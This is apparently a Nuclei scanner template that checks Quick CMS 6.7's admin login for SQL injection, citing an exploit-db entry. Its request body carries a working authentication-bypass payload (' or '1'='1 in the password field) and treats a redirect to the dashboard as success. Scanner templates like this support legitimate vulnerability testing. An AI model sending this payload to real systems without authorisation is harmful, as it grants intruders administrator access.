id: sqli-quick-cms
info:
  name: password-sqli-quick-cms-6.7
  author: Br1g0
  severity: info
  description: Check sqli vulnerability in admin login panel Quick CMS 6.7.
  reference: https://www.exploit-db.com/exploits/51967

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin.php?p=login"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Origin: "{{BaseURL}}"
      Referer: "{{BaseURL}}/admin.php"
      Sec-Fetch-User: ?1
      Upgrade-Insecure-Requests: 1
      User-Agent: Some-Random-User-Agent
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    body: 'sEmail=test%40test.com&sPass=%27+or+%271%27%3D%271&bAcceptLicense=1&iAcceptLicense=true'
    matchers:
      - type: status
        status:
          - 302
      - type: word
        words:
          - "Location: admin.php?p=dashboard"